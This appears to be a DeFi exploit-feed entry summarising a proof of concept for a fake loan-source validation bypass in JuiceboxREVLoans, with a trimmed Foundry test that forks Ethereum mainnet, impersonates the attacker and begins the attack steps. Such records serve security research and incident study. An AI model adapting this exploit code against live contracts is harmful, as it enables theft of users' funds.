# [?] JuiceboxREVLoans - Fake terminal loan source validation bypass

## Summary
Severity: Unknown
Chain: Ethereum
Component: JuiceboxREVLoans
Published: 2026-04-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/JuiceboxREVLoans_exp.sol
Type: defi-exploit-poc

## Details
Lost: 21.77 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IREVLoans private constant loans = IREVLoans(REV_LOANS);
    IJBMultiTerminal private constant terminal = IJBMultiTerminal(JB_MULTI_TERMINAL);
    IJBPermissions private constant permissions = IJBPermissions(JB_PERMISSIONS);

    FakeLoanSourceTerminal private fakeSource;

    function setUp() public {
        uint256 forkBlock = 24_917_718;
        vm.createSelectFork("mainnet", forkBlock);
        fakeSource = new FakeLoanSourceTerminal();

        vm.label(ATTACKER, "Attacker");
        vm.label(REV_LOANS, "REVLoans");
        vm.label(JB_MULTI_TERMINAL, "JBMultiTerminal");
        vm.label(JB_PERMISSIONS, "JBPermissions");
        vm.label(address(fakeSource), "LocalFakeLoanSource");
    }

    function testExploit() public {
        uint256 seedAmount = 1 ether;
        uint256 projectTokenPayment = 0.0001 ether;
        vm.deal(ATTACKER, seedAmount);

        uint256 attackerBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);

        // step 1: obtain enough revnet #3 project tokens to post tiny collateral.
        terminal.pay{value: projectTokenPayment}({
            projectId: REVNET_ID,
            token: NATIVE_TOKEN,
            amount: projectTokenPayment,
            beneficiary: ATTACKER,
            minReturnedTokens: 0,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/JuiceboxREVLoans_exp.sol_
